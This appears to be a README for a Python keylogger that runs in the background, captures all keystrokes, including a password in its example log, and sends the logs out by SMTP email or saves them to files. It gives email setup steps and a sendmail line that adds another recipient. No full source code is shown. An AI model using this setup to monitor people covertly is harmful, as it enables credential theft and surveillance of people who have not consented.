# Keylogger

## Overview

A Python-based keylogger application designed for educational and authorized monitoring purposes. This tool captures keyboard input and can report logged data either via email or by saving to local files. The application runs in the background and provides detailed logs of all keystrokes.

## DISCLAIMER

**WARNING: This software is for EDUCATIONAL PURPOSES ONLY.**

- **Legal Use Only**: Use only on computers you own or have explicit written permission to monitor
- **Consent Required**: In most jurisdictions, monitoring keystrokes without consent is illegal
- **Educational Purpose**: This tool is intended for learning about Python, security, and monitoring concepts
- **Responsibility**: Users are solely responsible for complying with local laws and regulations

## Features

### Core Functionality
- **Keystroke Logging**: Captures all keyboard input including special keys
- **Multiple Reporting Methods**: Email or local file storage
- **Scheduled Reporting**: Configurable reporting intervals
- **Special Key Handling**: Proper formatting for space, enter, and other special keys
- **Timestamp Logging**: All logs include precise timestamps

### Technical Features
- **Background Operation**: Runs unobtrusively in the background
- **Error Handling**: Comprehensive error handling for robust operation
- **Configurable Intervals**: Adjustable reporting frequency
- **Cross-Platform**: Works on Windows, macOS, and Linux (with appropriate permissions)
- **Email Encryption**: Uses TLS for secure email transmission

## Project Structure

```
keylogger.py
├── Configuration Section
│   ├── SEND_REPORT_EVERY: Reporting interval (seconds)
│   ├── EMAIL_ADDRESS: Sender/recipient email
│   └── EMAIL_PASSWORD: Email app password
│
├── Keylogger Class
│   ├── __init__(): Initializes logger with parameters
│   ├── callback(): Processes keystroke events
│   ├── update_filename(): Generates timestamped filenames
│   ├── report_to_file(): Saves logs to local files
│   ├── prepare_mail(): Formats email with HTML content
│   ├── sendmail(): Sends email via SMTP
│   ├── report(): Main reporting logic
│   └── start(): Starts the keylogger
│
└── Main Execution Block
    ├── User interface for configuration
    ├── Method selection (email/file)
    └── Application startup
```

## Installation & Setup

### Prerequisites

1. **Python 3.6+**: Ensure Python is installed
   ```bash
   python --version
   ```

2. **Required Python Packages**:
   ```bash
   pip install keyboard
   ```

   *Note: No additional installation needed for other modules (smtplib, threading, datetime, email) as they are part of Python's standard library.*

### Email Configuration (For Email Reporting)

#### For Gmail Users:
1. **Enable 2-Factor Authentication**:
   - Go to Google Account → Security → 2-Step Verification → Turn on

2. **Generate App Password**:
   - Go to Google Account → Security → App passwords
   - Select "Mail" as app and "Other" as device
   - Generate and copy the 16-character password

3. **Update Script Configuration**:
   ```python
   EMAIL_ADDRESS = "your_email@gmail.com"  # Replace with your email
   EMAIL_PASSWORD = "your_app_password"    # Replace with generated app password
   ```

#### For Other Email Providers:
- **Outlook/Hotmail**: `smtp.office365.com`, port 587
- **Yahoo**: `smtp.mail.yahoo.com`, port 587
- **iCloud**: `smtp.mail.me.com`, port 587

## Usage Instructions

### Running the Application

#### Basic Execution:
```bash
python keylogger.py
```

#### On Linux (Root Access Required):
```bash
sudo python3 keylogger.py
```

### Step-by-Step Setup

1. **Start the Application**:
   ```bash
   python keylogger.py
   ```

2. **Choose Reporting Method**:
   ```
   Choose reporting method:
   1. Email (requires Gmail with App Password)
   2. Save to file
   ```

3. **Set Reporting Interval**:
   ```
   Enter reporting interval in seconds (default 60):
   ```

4. **Start Monitoring**:
   ```
   [+] Starting with [method] reporting every [interval] seconds
   [+] Keylogger is running...
   ```

5. **Stop the Keylogger**:
   - Press the **ESC** key to stop monitoring

### Output Examples

#### Email Reports Include:
- HTML formatted email with timestamp
- Plain text backup of keystrokes
- Subject: "Keylogger logs"

#### File Reports:
- Saved as: `keylog-YYYY-MM-DD_HH-MM-SS_YYYY-MM-DD_HH-MM-SS.txt`
- Contains raw keystroke data

## Configuration Options

### Script Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `SEND_REPORT_EVERY` | 60 | Reporting interval in seconds |
| `EMAIL_ADDRESS` | "your_email@gmail.com" | Email for sending/receiving logs |
| `EMAIL_PASSWORD` | "your_app_password" | Email application password |

### Runtime Options

1. **Reporting Method**:
   - **Email**: Sends logs via SMTP to configured email
   - **File**: Saves logs to local text files

2. **Reporting Interval**: Customizable time between reports (seconds)

## Security Considerations

### Email Security
- Uses TLS encryption for email transmission
- Requires app-specific passwords (not main account passwords)
- Sends to and from the same email address by default

### Local Storage
- Files are saved in plain text
- No encryption on local files
- Consider adding encryption for sensitive environments

### Permission Requirements
- **Windows**: Runs with user permissions
- **macOS**: May require accessibility permissions
- **Linux**: Requires root/sudo permissions

## Troubleshooting

### Common Issues

#### 1. "ModuleNotFoundError: No module named 'keyboard'"
```bash
pip install keyboard
```

#### 2. "You must be root to use this library on linux"
```bash
sudo python3 keylogger.py
```

#### 3. SMTP Authentication Errors
- Verify 2-factor authentication is enabled
- Ensure you're using an app password, not your regular password
- Check email provider SMTP settings

#### 4. Email Not Sending
- Verify internet connection
- Check firewall settings (port 587 should be open)
- Confirm email credentials are correct

#### 5. Keylogger Not Capturing Keystrokes
- On macOS: Grant Accessibility permissions
- On Linux: Run with sudo
- Ensure no other keyloggers are interfering

### Error Messages and Solutions

| Error Message | Solution |
|---------------|----------|
| "[-] Error sending email: ..." | Check SMTP settings and credentials |
| "[-] Error saving to file: ..." | Check write permissions in current directory |
| "[-] Error preparing mail: ..." | Check email formatting in prepare_mail() |
| Keyboard not capturing input | Verify permissions and run as admin/root |

## Email Configuration Details

### SMTP Server Settings

| Provider | SMTP Server | Port | Encryption |
|----------|-------------|------|------------|
| Gmail | smtp.gmail.com | 587 | TLS |
| Outlook | smtp.office365.com | 587 | TLS |
| Yahoo | smtp.mail.yahoo.com | 587 | TLS |
| iCloud | smtp.mail.me.com | 587 | TLS |

### Creating App Passwords

1. **Gmail**: Google Account → Security → App passwords
2. **Outlook**: Microsoft Account → Security → Advanced security options
3. **Yahoo**: Account Security → Generate app password

## Log Format

### Keystroke Representation

| Key | Log Representation |
|-----|-------------------|
| Alphabet/Numbers | Character itself |
| Space | `" "` (space character) |
| Enter | `"[ENTER]\n"` |
| Special Keys | `"[KEY_NAME]"` (uppercase) |
| Decimal Point | `"."` |

### Example Log Output
```
Hello[ENTER]
This is a test.[ENTER]
My password is: secret123[ENTER]
```

## Customization

### Modifying Reporting Frequency
```python
# Change in configuration section
SEND_REPORT_EVERY = 300  # Report every 5 minutes
```

### Adding Additional Email Recipients
```python
# In sendmail() method, modify:
server.sendmail(email, "additional@email.com", email_message.as_string())
```

### Changing Log File Location
```python
# In report_to_file() method:
with open(f"/path/to/logs/{self.filename}.txt", "w") as f:
```

## Testing

### Safe Testing Environment
1. **Virtual Machine**: Test in an isolated VM
2. **Test Account**: Use disposable email accounts
3. **Local Files Only**: Start with file reporting method
4. **Short Intervals**: Set SEND_REPORT_EVERY to 10-30 seconds for testing

### Verification Steps
1. Run keylogger
2. Type test phrases
3. Wait for reporting interval
4. Check email or local file for logs
5. Verify all keystrokes are captured

## Educational Value

This project demonstrates:
- Python event-driven programming
- SMTP email handling
- File I/O operations
- Multithreading with Timer
- Error handling and logging
- System-level keyboard monitoring

## Contributing

### Reporting Issues
1. Check existing issues
2. Provide detailed error messages
3. Include system information
4. Describe steps to reproduce

### Feature Requests
1. Clear description of proposed feature
2. Justification for inclusion
3. Optional: Code implementation

## License

This project is provided for educational purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations.

## 🚨 Emergency Stop

If the keylogger needs to be terminated immediately:
1. **Windows**: Open Task Manager → End Python process
2. **macOS/Linux**: Use `kill` command or System Monitor
3. **All Systems**: Physical power cycle (last resort)

---

**Remember**: With great power comes great responsibility. Use this tool ethically and legally.
